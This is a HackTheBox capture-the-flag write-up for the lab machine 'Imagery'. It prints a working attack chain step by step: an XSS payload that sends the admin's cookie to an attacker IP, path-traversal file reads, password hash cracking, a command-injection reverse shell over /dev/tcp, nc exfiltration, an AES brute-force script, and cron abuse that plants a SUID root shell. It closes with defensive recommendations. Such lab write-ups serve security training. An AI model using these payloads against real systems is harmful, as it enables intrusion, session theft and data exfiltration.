# HackTheBox - Imagery Writeup

![Difficulty](https://img.shields.io/badge/Difficulty-Medium-yellow)
![OS](https://img.shields.io/badge/OS-Linux-blue)
![Release](https://img.shields.io/badge/Release-2025-green)

## Machine Information

| Attribute | Details |
|-----------|---------|
| **Machine Name** | Imagery |
| **IP Address** | 10.10.11.88 |
| **Difficulty** | Medium |
| **Operating System** | Linux (Ubuntu) |
| **Key Techniques** | XSS, Cookie Stealing, LFI, RCE, AES Cracking, Privilege Escalation |

---

## Table of Contents
1. [Reconnaissance](#reconnaissance)
2. [Initial Access](#initial-access)
3. [Privilege Escalation to User](#privilege-escalation-to-user)
4. [Privilege Escalation to Root](#privilege-escalation-to-root)
5. [Key Takeaways](#key-takeaways)

---

## Reconnaissance

### Port Scanning

Let's start by discovering open ports and services on the target:

```bash
nmap -T4 -A -v 10.10.11.88
```

**Results:**
- **Port 22**: OpenSSH 9.7p1 (SSH service)
- **Port 8000**: Werkzeug HTTP server (Python-based web application)

### Web Enumeration

Add the hostname to your `/etc/hosts` file:

```bash
echo "10.10.11.88 imagery.htb" | sudo tee -a /etc/hosts
```

Navigate to `http://imagery.htb:8000/` and explore the web application.

#### Directory Brute-forcing

```bash
feroxbuster -u http://imagery.htb:8000 \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -t 50
```

**Key Findings:**
- Image upload functionality
- User registration/login system
- Admin panel (restricted access)
- Bug report feature

---

## Initial Access

### Step 1: Account Registration

Navigate to the registration page and create a new user account. After logging in, you'll notice:
- You can upload images
- Image transformation features are restricted
- There's a "Report Bug" functionality

### Step 2: XSS Attack - Cookie Stealing

The bug report feature is vulnerable to **Cross-Site Scripting (XSS)**. We can exploit this to steal the admin's session cookies.

**Set up a listener to capture cookies:**

```bash
python3 -m http.server 80
```

**Submit the following XSS payload in the bug report form:**

```html
<img src=1 onerror="document.location='http://10.10.14.74/steal?c='+ document.cookie">
```

**What happens:**
1. Admin views the bug report
2. The malicious JavaScript executes in their browser
3. Their cookies are sent to your HTTP server
4. You capture the admin session cookie

**Monitor your HTTP server logs:**

```bash
10.10.11.88 - - [30/Sep/2025 08:15:32] "GET /steal?c=session=eyJsb2dnZWRfaW4iOnRydWUsInVzZXJfaWQiOjF9... HTTP/1.1" 200 -
```

### Step 3: Session Hijacking

**Inject the stolen cookie into your browser:**

1. Open Developer Tools (F12)
2. Navigate to **Application** → **Storage** → **Cookies**
3. Replace your session cookie with the admin's session cookie
4. Refresh the page

🎉 **You now have admin access!**

### Step 4: Local File Inclusion (LFI) Exploitation

As an admin, you can download system logs. This functionality is vulnerable to **Local File Inclusion (LFI)**.

**Test for LFI vulnerability:**

```bash
curl "http://imagery.htb:8000/admin/get_system_log?log_identifier=../../../../../etc/passwd"
```

**Success!** The application reads arbitrary files. Let's extract the application database:

```bash
curl "http://imagery.htb:8000/admin/get_system_log?log_identifier=../../../../../home/web/web/db.json" \
  -H "Cookie: session=<ADMIN_SESSION_COOKIE>" \
  -o db.json
```

### Step 5: Password Cracking

The `db.json` file contains user credentials with password hashes:

```json
{
  "users": [
    {
      "email": "testuser@imagery.htb",
      "password_hash": "2c9341ca4cf3d87b9e4eb905d6a3ec45"
    }
  ]
}
```

**Crack the hash using CrackStation or hashcat:**

```bash
# MD5 hash identified
echo "2c9341ca4cf3d87b9e4eb905d6a3ec45" > hash.txt
hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt
```

**Result:** `testuser@imagery.htb:iambatman`

### Step 6: Remote Code Execution via Image Transformation

Login with the credentials `testuser@imagery.htb:iambatman`.

**RCE Vector:** The image transformation feature executes shell commands!

**Steps:**
1. Upload an image
2. Navigate to **Image Gallery**
3. Click the three dots → **Transform Image** → **Crop**
4. Intercept the request with **Burp Suite**

**Original Request:**

```json
POST /api/transform_image HTTP/1.1
Host: imagery.htb:8000
Content-Type: application/json

{
  "imageId": "108c9306-29e9-4717-b150-5a51eea7b56f",
  "transformType": "crop",
  "params": {
    "x": 0,
    "y": 0,
    "width": 640,
    "height": 640
  }
}
```

**The `x` parameter is vulnerable to command injection!**

### Step 7: Reverse Shell

**Set up a listener on your attacking machine:**

```bash
pwncat-cs -p 4444
```

**Modify the request to inject a reverse shell:**

```json
{
  "imageId": "108c9306-29e9-4717-b150-5a51eea7b56f",
  "transformType": "crop",
  "params": {
    "x": ";setsid /bin/bash -c \"/bin/bash -i >& /dev/tcp/10.10.14.74/4444 0>&1\";",
    "y": 0,
    "width": 640,
    "height": 640
  }
}
```

**Send the request and catch the shell!**

```bash
[08:18:45] Welcome to pwncat 🐈!
```

**Important:** When you first connect, you'll be at the pwncat **local prompt**:

```bash
(local) pwncat$
```

This is pwncat's command interface on YOUR machine, not the remote shell. To access the actual remote shell on the target, type:

```bash
(local) pwncat$ back
```

Now you'll have access to the remote shell:

```bash
(remote) web@imagery:/home/web/web$
```

**Pwncat Quick Reference:**
- `back` or `Ctrl+D` - Return to the remote shell
- `Ctrl+C` - Return to local pwncat prompt
- `download <remote_file> <local_file>` - Download files from target
- `upload <local_file> <remote_file>` - Upload files to target
- `exit` - Close the connection

🎉 **Initial access achieved as user `web`!**

---

## Privilege Escalation to User

### Step 8: System Enumeration

**Upload and run LinPEAS for automated enumeration:**

```bash
# On your machine
python3 -m http.server 8080

# On target
wget http://10.10.14.74:8080/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

**Key Finding:** Encrypted backup file discovered!

```
/var/backup/web_20250806_120723.zip.aes
```

### Step 9: File Exfiltration

**Transfer the encrypted file to your attacking machine:**

```bash
# On your attacking machine
nc -lvnp 4445 > web_20250806_120723.zip.aes

# On target machine
nc 10.10.14.74 4445 < /var/backup/web_20250806_120723.zip.aes
```

Alternatively, use pwncat's download feature:

```bash
(local) pwncat$ download /var/backup/web_20250806_120723.zip.aes
```

### Step 10: AES Encryption Cracking

The file is encrypted using **pyAesCrypt**. Let's brute-force the password!

**Install pyAesCrypt:**

```bash
pip3 install pyAesCrypt --break-system-packages
```

**Create an optimized multi-threaded cracking script:**

```python
#!/usr/bin/env python3
import pyAesCrypt
import sys
import os
from multiprocessing import Pool, cpu_count
from datetime import datetime

def validate_password(args):
    encrypted_file, password, output_file = args
    buffer_size = 64 * 1024
    
    try:
        with open(encrypted_file, 'rb') as fIn:
            with open(output_file + '.tmp', 'wb') as fOut:
                pyAesCrypt.decryptStream(fIn, fOut, password, buffer_size)
        
        os.rename(output_file + '.tmp', output_file)
        return (True, password)
    except:
        try:
            if os.path.exists(output_file + '.tmp'):
                os.remove(output_file + '.tmp')
        except:
            pass
        return (False, None)

def crack_aes(encrypted_file, wordlist, output_file, num_processes=None):
    if num_processes is None:
        num_processes = max(1, cpu_count() - 1)
    
    print(f"[*] Starting AES cracking")
    print(f"[*] Processes: {num_processes}")
    
    total_passwords = sum(1 for _ in open(wordlist, 'r', encoding='latin-1', errors='ignore'))
    print(f"[*] Total passwords: {total_passwords:,}\n")
    
    start_time = datetime.now()
    count = 0
    batch_size = 100
    
    with open(wordlist, 'r', encoding='latin-1', errors='ignore') as f:
        batch = []
        
        for password in f:
            password = password.strip()
            if not password:
                continue
            
            count += 1
            batch.append((encrypted_file, password, output_file))
            
            if len(batch) >= batch_size:
                with Pool(processes=num_processes) as pool:
                    results = pool.map(validate_password, batch)
                
                for success, pwd in results:
                    if success:
                        elapsed = (datetime.now() - start_time).total_seconds()
                        print(f"\n[+] SUCCESS! Password: {pwd}")
                        print(f"[+] Time: {elapsed:.2f}s | Tried: {count:,}")
                        return pwd
                
                batch = []
                
                # Progress
                elapsed = (datetime.now() - start_time).total_seconds()
                rate = count / elapsed if elapsed > 0 else 0
                percent = (count / total_passwords) * 100
                print(f"\r[{percent:.2f}%] {count:,}/{total_passwords:,} | {rate:.0f} pwd/s", end='')
    
    print(f"\n[-] Password not found")
    return None

if __name__ == "__main__":
    crack_aes(sys.argv[1], sys.argv[2], sys.argv[3])
```

**Run the cracker:**

```bash
python3 crack_aes.py web_20250806_120723.zip.aes /usr/share/wordlists/rockyou.txt decrypted.zip
```

**Output:**

```
[*] Starting AES cracking
[*] Processes: 5
[*] Total passwords: 14,344,392

[0.00%] 600/14,344,392 | 14 pwd/s

[+] SUCCESS! Password: bestfriends
[+] Time: 48.48s | Tried: 700
```

### Step 11: Extract and Analyze Backup

**Decrypt the file manually:**

```bash
python3 -c "import pyAesCrypt; pyAesCrypt.decryptFile('web_20250806_120723.zip.aes', 'decrypted.zip', 'bestfriends', 64*1024)"
```

**Extract the contents:**

```bash
unzip decrypted.zip
cd web/
ls -la
```

**Contents:**
```
api_admin.py
api_auth.py
api_edit.py
api_manage.py
api_misc.py
api_upload.py
app.py
config.py
db.json          ← Important!
utils.py
```

### Step 12: Discover User Credentials

**Examine `db.json`:**

```bash
cat db.json
```

**Output:**

```json
{
  "users": [
    {
      "email": "mark@imagery.htb",
      "password_hash": "01c3d2e5bdaf6134cec0a367cf53e535"
    }
  ]
}
```

**Crack the hash:**

```bash
echo "01c3d2e5bdaf6134cec0a367cf53e535" > mark_hash.txt
hashcat -m 0 mark_hash.txt /usr/share/wordlists/rockyou.txt
```

**Result:** `mark:supersmash`

### Step 13: User Flag

**Switch to user mark:**

```bash
su mark
# Password: supersmash
```

**Retrieve the user flag:**

```bash
cat /home/mark/user.txt
```

🚩 **User flag captured!**

---

## Privilege Escalation to Root

### Step 14: Sudo Privileges Enumeration

Check what commands `mark` can run with sudo:

```bash
sudo -l
```

**Output:**

```
User mark may run the following commands on Imagery:
    (ALL) NOPASSWD: /usr/local/bin/charcol
```

**Interesting!** We can run `/usr/local/bin/charcol` as root without a password.

### Step 15: Analyze Charcol Binary

**Check if it's a binary or script:**

```bash
file /usr/local/bin/charcol
```

**Explore its capabilities:**

```bash
sudo /usr/local/bin/charcol --help
```

**Key findings:**
- Charcol is a backup management tool
- It has a `shell` command for interactive mode
- It includes an `auto add` feature for **adding cron jobs**
- **Security Warning:** "Charcol does NOT validate the safety of the --command"

### Step 16: Reset Application Password

First, reset the Charcol password to bypass authentication:

```bash
sudo /usr/local/bin/charcol -R
```

**Output:**

```
[INFO] System password verification required for this operation.
Enter system password for user 'mark' to confirm: supersmash

[INFO] System password verified successfully.
Removed existing config file: /root/.charcol/.charcol_config
Charcol application password has been reset to default (no password mode).
```

### Step 17: Enter Interactive Shell

```bash
sudo /usr/local/bin/charcol shell
```

**You're now in the Charcol interactive shell as root!**

### Step 18: Exploit Cron Job Feature

The `auto add` command allows us to create cron jobs that run **arbitrary shell commands as root**.

**Check available commands:**

```bash
help auto
```

**Key information:**
- We can add cron jobs with custom shell commands
- Since we're in "no password mode" (status 2), it only requires the system password
- The `--command` parameter is **not validated** for safety

### Step 19: Create Malicious Cron Job

**Option 1: Create a SUID binary for persistent root access**

```bash
auto add --schedule "* * * * *" --command "/bin/cp /bin/bash /tmp/rootbash && /bin/chmod +s /tmp/rootbash" --name "rootshell"
```

**Explanation:**
- **Schedule:** `* * * * *` (runs every minute)
- **Command:** Copies bash to `/tmp/rootbash` and sets the SUID bit
- **Name:** `rootshell` (job identifier)

**When prompted, enter mark's password:** `supersmash`

**Output:**

```
[INFO] System password verified successfully.
[INFO] Auto job 'rootshell' (ID: 2c6d5e7f-562f-463d-8e4f-3c8ab39ea10f) added successfully.
[INFO] Cron line added: * * * * * CHARCOL_NON_INTERACTIVE=true /bin/cp /bin/bash /tmp/rootbash && /bin/chmod +s /tmp/rootbash
```

**Option 2: Directly steal the root flag**

```bash
auto add --schedule "* * * * *" --command "/bin/bash -c 'cat /root/root.txt > /tmp/root_flag.txt && chmod 777 /tmp/root_flag.txt'" --name "getflag"
```

### Step 20: Wait and Exploit

**Exit the Charcol shell:**

```bash
exit
```

**Wait approximately 60 seconds for the cron job to execute.**

**For Option 1 (SUID binary):**

```bash
# Check if the file was created
ls -la /tmp/rootbash
```

**Output:**

```
-rwsr-sr-x 1 root root 1474768 Sep 30 08:29 /tmp/rootbash
```

**Execute the SUID bash with preserved privileges:**

```bash
/tmp/rootbash -p
```

**Note:** The `-p` flag is crucial - it tells bash to run in privileged mode, preserving the effective UID.

**For Option 2 (Direct flag extraction):**

```bash
cat /tmp/root_flag.txt
```

### Step 21: Root Flag

**Verify you're root:**

```bash
whoami  # Should output: root
id      # Should show uid=0(root)
```

**Capture the root flag:**

```bash
cat /root/root.txt
```

🚩 **Root flag captured!**

---

## Key Takeaways

### Vulnerabilities Exploited

1. **Cross-Site Scripting (XSS)**
   - Unsanitized user input in bug report feature
   - Led to session hijacking and admin access

2. **Local File Inclusion (LFI)**
   - Improper path validation in log download functionality
   - Allowed arbitrary file read access

3. **Command Injection**
   - Insufficient input validation in image transformation parameters
   - Enabled remote code execution

4. **Weak Password Practices**
   - Users with weak passwords susceptible to dictionary attacks
   - Password reuse across different accounts

5. **Insecure Backup Storage**
   - Sensitive data stored in encrypted backups with weak passwords
   - Proper key management not implemented

6. **Privilege Escalation via Sudo Misconfiguration**
   - Allowing unrestricted sudo access to backup management tool
   - The tool permitted arbitrary command execution via cron jobs

### Security Recommendations

1. **Input Validation & Sanitization**
   - Implement strict input validation for all user-supplied data
   - Use Content Security Policy (CSP) headers to prevent XSS
   - Sanitize file paths to prevent directory traversal attacks

2. **Authentication & Session Management**
   - Implement HTTPOnly and Secure flags on session cookies
   - Use strong, randomly generated session tokens
   - Implement rate limiting on authentication endpoints

3. **Password Security**
   - Enforce strong password policies
   - Use modern hashing algorithms (bcrypt, Argon2)
   - Implement multi-factor authentication (MFA)

4. **Least Privilege Principle**
   - Restrict sudo privileges to only necessary commands
   - Validate and sanitize all parameters in privileged executables
   - Avoid allowing arbitrary command execution in trusted binaries

5. **Secure File Handling**
   - Use strong encryption with proper key management
   - Store sensitive backups in secure locations with restricted access
   - Implement integrity checks for critical files

6. **Command Execution Safety**
   - Never execute shell commands with unsanitized user input
   - Use parameterized functions instead of string concatenation
   - Implement allowlists for permitted commands

### Attack Chain Summary

```
1. Web Enumeration → Discovered XSS in bug report
2. XSS Exploitation → Stole admin session cookies
3. Session Hijacking → Gained admin panel access
4. LFI Exploitation → Read application database file
5. Password Cracking → Obtained user credentials (testuser)
6. Command Injection → Achieved RCE via image transformation
7. Reverse Shell → Initial foothold as 'web' user
8. File Discovery → Found encrypted backup file
9. AES Cracking → Decrypted backup with weak password
10. Credential Discovery → Found 'mark' user credentials
11. User Escalation → Switched to 'mark' user
12. Sudo Analysis → Discovered charcol binary with NOPASSWD
13. Cron Job Abuse → Created malicious cron job as root
14. Root Access → Retrieved root flag
```

### Tools Used

- **nmap** - Port scanning and service enumeration
- **feroxbuster** - Directory/file brute-forcing
- **Burp Suite** - Request interception and modification
- **pwncat-cs** - Reverse shell handler with advanced features
- **LinPEAS** - Linux privilege escalation enumeration
- **pyAesCrypt** - AES encryption/decryption library
- **hashcat** - Password hash cracking
- **Python** - Custom exploit script development

---

## Conclusion

Imagery was an engaging medium-difficulty machine that demonstrated multiple realistic attack vectors:
- Client-side attacks (XSS)
- Server-side vulnerabilities (LFI, Command Injection)
- Cryptographic weaknesses (weak password on encrypted files)
- Privilege escalation via misconfigured sudo permissions

The machine emphasized the importance of defense-in-depth strategies, as a single vulnerability might not compromise the system, but a chain of vulnerabilities led to complete system compromise.

---

*Happy Hacking! 🎯*
